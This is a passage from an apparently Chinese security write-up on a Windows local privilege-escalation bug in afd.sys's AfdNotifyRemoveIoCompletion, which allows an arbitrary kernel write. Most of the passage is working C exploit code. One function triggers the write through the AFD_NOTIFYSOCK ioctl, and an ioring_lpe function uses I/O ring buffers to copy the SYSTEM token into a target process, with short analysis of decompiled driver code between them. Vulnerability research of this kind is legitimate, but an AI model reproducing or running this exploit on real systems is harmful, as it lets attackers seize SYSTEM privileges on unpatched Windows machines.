
```  
int ioring\_lpe(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCnt)
{
int ret = -1;
HANDLE hProc = NULL;
ULONG64 ullSystemEPROCaddr = 0;
ULONG64 ullTargEPROCaddr = 0;
PVOID pFakeRegBuffers = NULL;
\_HIORING\* phIoRing = NULL;
ULONG64 ullSysToken = 0;
char null[0x10] = { 0 };
hProc = OpenProcess(PROCESS\_QUERY\_INFORMATION, 0, pid);
if (NULL == hProc)
{
ret = GetLastError();
goto done;
}
ret = getobjptr(&ullSystemEPROCaddr, 4, 4);
if (0 != ret)
{
goto done;
}
printf("[+] System EPROC address: %llx\n", ullSystemEPROCaddr);
ret = getobjptr(&ullTargEPROCaddr, GetCurrentProcessId(), hProc);
if (0 != ret)
{
goto done;
}
printf("[+} Target process EPROC address: %llx\n", ullTargEPROCaddr);
pFakeRegBuffers = VirtualAlloc(ullFakeRegBufferAddr, sizeof(ULONG64) \* ulFakeRegBufferCnt, MEM\_RESERVE | MEM\_COMMIT, PAGE\_READWRITE);
if (pFakeRegBuffers != (PVOID)ullFakeRegBufferAddr)
{
ret = GetLastError();
goto done;
}
memset(pFakeRegBuffers, 0, sizeof(ULONG64) \* ulFakeRegBufferCnt);
phIoRing = \*(\_HIORING\*\*)&hIoRing;
phIoRing->RegBufferArray = pFakeRegBuffers;
phIoRing->BufferArraySize = ulFakeRegBufferCnt;
ret = ioring\_read(pFakeRegBuffers, ullSystemEPROCaddr + EPROC\_TOKEN\_OFFSET, &ullSysToken, sizeof(ULONG64));
if (0 != ret)
{
goto done;
}
printf("[+] System token is at: %llx\n", ullSysToken);
ret = ioring\_write(pFakeRegBuffers, ullTargEPROCaddr + EPROC\_TOKEN\_OFFSET, &ullSysToken, sizeof(ULONG64));
if (0 != ret)
{
goto done;
}
ioring\_write(pFakeRegBuffers, &pIoRing->RegBuffersCount, &null, 0x10);
ret = 0;
done:
return ret;
}
```  

### 漏洞成因

通过`diff`可以判断漏洞点位于`afd.sys`的`AfdNotifyRemoveIoCompletion`函数。

![](upload/attach/202303/913941\_JJ6KSBRYUP79VVV.png)

这里可以看出没有对`(_DWORD **)(a3 + 24)`进行进行验证就把`v18`赋值，所以设置好这里就可以实现任意写。

查找这个函数的引用是`AfdNotifySock`。继续查找引用，发现其在`AfdImmediateCallDispatch`中是最后一个函数，

在`AfdIoctlTable`中找到最后一个`ioctl_code`，是`0x12127`。

与`afd.sys`交互参考<a href="elink@d6aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2^5z5o6k6E0j5i4c8@1K9r3g2%4i4K6u0W2j5$3!0E0i4K6u0r3N6X3W2W2N6#2)9#2k6Y4m8G2M7%4c8Q4x3@1k6A6k6q4)9K6c8r3&6@1M7$3!0U0K9$3g2@1M7H3`.`.">x86matthew - NTSockets - Downloading a file via HTTP using the NtCreateFile and NtDeviceIoControlFile syscalls</a>

查看`AfdNotifySock`函数。

![](upload/attach/202303/913941\_WF96SR2QS9HUENH.png)

检测

```
if ( InputBufferLength != 0x30 || OutputBufferLength )
{
v10 = STATUS\_INFO\_LENGTH\_MISMATCH;
goto LABEL\_45;
}
if ( !v7->dwCounter )
goto LABEL\_5;
if ( v7->dwLen )
{
if ( !v7->pPwnPtr || !v7->pData2 )
goto LABEL\_5;
}
else if ( v7->pData2 || v7->dwTimeout )
{
LABEL\_5:
v10 = STATUS\_INVALID\_PARAMETER;
goto LABEL\_45;
}
v11 = v7->hCompletion;
Object = 0i64;
v10 = ObReferenceObjectByHandle(v11, 2u, IoCompletionObjectType, pre\_mode, &Object, 0i64);
if ( v10 >= 0 )
{
v12 = IoIs32bitProcess(0i64);
v13 = 0;
v14 = (unsigned \_\_int64 \*)MmUserProbeAddress;
while ( v13 < v7->dwCounter )
{
if ( pre\_mode )
{
v24 = 0i64;
v25 = 0i64;
v15 = v13;
v16 = v7->pData1;
if ( v12 )
{
v17 = (unsigned \_\_int64)v16 + 16 \* v13;
v31 = v17;
if ( (v17 & 3) != 0 )
ExRaiseDatatypeMisalignment();
if ( v17 + 16 > \*v14 || v17 + 16 < v17 )
\*(\_BYTE \*)\*v14 = 0;
\*(\_QWORD \*)&v24 = \*(unsigned int \*)v17;
\*((\_QWORD \*)&v24 + 1) = \*(unsigned int \*)(v17 + 4);
LOWORD(v25) = \*(\_WORD \*)(v17 + 8);
BYTE2(v25) = \*(\_BYTE \*)(v17 + 10);
}
else
{
v17 = (unsigned \_\_int64)v16 + 24 \* v13;
if ( v17 >= \*v14 )
v17 = \*v14;
v24 = \*(\_OWORD \*)v17;
v25 = \*(\_QWORD \*)(v17 + 16);
}
v18 = &v24;
v27 = &v24;
}
else
{
v15 = v13;
v17 = 3i64 \* v13;
v18 = (\_\_int128 \*)((char \*)v7->pData1 + 24 \* v13);
v27 = v18;
}
v19 = a1;
if ( v13 )
v19 = 0i64;
LOBYTE(v17) = pre\_mode;
v20 = AfdNotifyProcessRegistration(v17, v9, v18, v19);
if ( pre\_mode )
{
v21 = (char \*)v7->pData1;
v14 = (unsigned \_\_int64 \*)MmUserProbeAddress;
if ( v12 )
v22 = &v21[16 \* v15 + 12];
else
v22 = &v21[24 \* v15 + 20];
if ( (unsigned \_\_int64)v22 >= MmUserProbeAddress )
v22 = (char \*)MmUserProbeAddress;
\*(\_DWORD \*)v22 = v20;
}
else
{
\*((\_DWORD \*)v7->pData1 + 6 \* v15 + 5) = v20;
v14 = (unsigned \_\_int64 \*)MmUserProbeAddress;
}
++v13;
}
v10 = AfdNotifyRemoveIoCompletion(pre\_mode, (\_\_int64)v9, (\_\_int64)v7);
}
```

为了过掉检测需要将`InputBufferLength`设置为`0x30`，将`hCompletion`通过未导出函数`NtCreateIoCompletion`设置为一个句柄，将`pdata1`设置为一块申请出的空间，`counter`设为1。

查看`AfdNotifyRemoveIoCompletion`函数

```
dwLen = a3->dwLen;
if ( !(\_DWORD)dwLen )
{
LABEL\_33:
v8 = 0;
goto LABEL\_34;
}
if ( a1 )
ProbeForWrite(a3->pData2, v9, v11);
v8 = IoRemoveIoCompletion(v25, Pool2, v4, (unsigned int)dwLen, &v20, a1, v13, 0);
if ( !v8 )
{
if ( v19 )
{
for ( i = 0; i < v20; ++i )
{
v15 = &Pool2[32 \* i];
v16 = (char \*)a3->pData2 + 16 \* i;
\*v16 = \*(\_DWORD \*)v15;
v16[1] = \*((\_DWORD \*)v15 + 2);
v16[3] = \*((\_DWORD \*)v15 + 6);
v16[2] = \*((\_DWORD \*)v15 + 4);
}
}
\*(\_DWORD \*)a3->pPwnPtr = v20;
goto LABEL\_33;
}
```

将`dwLen = 0x1`设为1, `pData2`设为一块申请出的内存，为了使`IoRemoveIoCompletion`返回0需要使用未导出函数`NtSetIoCompletion`。

最后整合到一起就是

```
int ArbitraryKernelWrite0x1(void\* pPwnPtr)
{
int ret = -1;
HANDLE hCompletion = INVALID\_HANDLE\_VALUE;
IO\_STATUS\_BLOCK IoStatusBlock = { 0 };
HANDLE hSocket = INVALID\_HANDLE\_VALUE;
UNICODE\_STRING ObjectFilePath = { 0 };
OBJECT\_ATTRIBUTES ObjectAttributes = { 0 };
AFD\_NOTIFYSOCK\_DATA Data = { 0 };
HANDLE hEvent = NULL;
HANDLE hThread = NULL;
// Hard-coded attributes for an IPv4 TCP socket
BYTE bExtendedAttributes[] =
{
0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00, 0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x60, 0xEF, 0x3D, 0x47, 0xFE
};
ret = \_NtCreateIoCompletion(&hCompletion, MAXIMUM\_ALLOWED, NULL, 1);
if (0 != ret)
{
goto done;
}
ret = \_NtSetIoCompletion(hCompletion, 0x1337, &IoStatusBlock, 0, 0x100);
if (0 != ret)
{
goto done;
}
ObjectFilePath.Buffer = (PWSTR)L"\\Device\\Afd\\Endpoint";
ObjectFilePath.Length = (USHORT)wcslen(ObjectFilePath.Buffer) \* sizeof(wchar\_t);
ObjectFilePath.MaximumLength = ObjectFilePath.Length;
ObjectAttributes.Length = sizeof(ObjectAttributes);
ObjectAttributes.ObjectName = &ObjectFilePath;
ObjectAttributes.Attributes = 0x40;
ret = \_NtCreateFile(&hSocket, MAXIMUM\_ALLOWED, &ObjectAttributes, &IoStatusBlock, NULL, 0, FILE\_SHARE\_READ | FILE\_SHARE\_WRITE, 1, 0, bExtendedAttributes, sizeof(bExtendedAttributes));
if (0 != ret)
{
goto done;
}
Data.hCompletion = hCompletion;
Data.pData1 = VirtualAlloc(NULL, 0x2000, MEM\_RESERVE | MEM\_COMMIT, PAGE\_READWRITE);
Data.pData2 = VirtualAlloc(NULL, 0x2000, MEM\_RESERVE | MEM\_COMMIT, PAGE\_READWRITE);
Data.dwCounter = 0x1;
Data.dwLen = 0x1;
Data.dwTimeout = 100000000;
Data.pPwnPtr = pPwnPtr;
if ((NULL == Data.pData1) || (NULL == Data.pData2))
{
ret = GetLastError();
goto done;
}
hEvent = CreateEvent(NULL, 0, 0, NULL);
if (NULL == hEvent)
{
ret = GetLastError();
goto done;
}
\_NtDeviceIoControlFile(hSocket, hEvent, NULL, NULL, &IoStatusBlock, AFD\_NOTIFYSOCK\_IOCTL, &Data, 0x30, NULL, 0);
ret = 0;
done:
if (INVALID\_HANDLE\_VALUE != hCompletion)
{
CloseHandle(hCompletion);
}
if (INVALID\_HANDLE\_VALUE != hSocket)
{
CloseHandle(hSocket);
}
if (NULL != hEvent)
{
CloseHandle(hEvent);
}
if (NULL != Data.pData1)
{
VirtualFree(Data.pData1, 0, MEM\_RELEASE);
}
if (NULL != Data.pData2)
{
VirtualFree(Data.pData2, 0, MEM\_RELEASE);
}
return ret;
}
```

## 参考
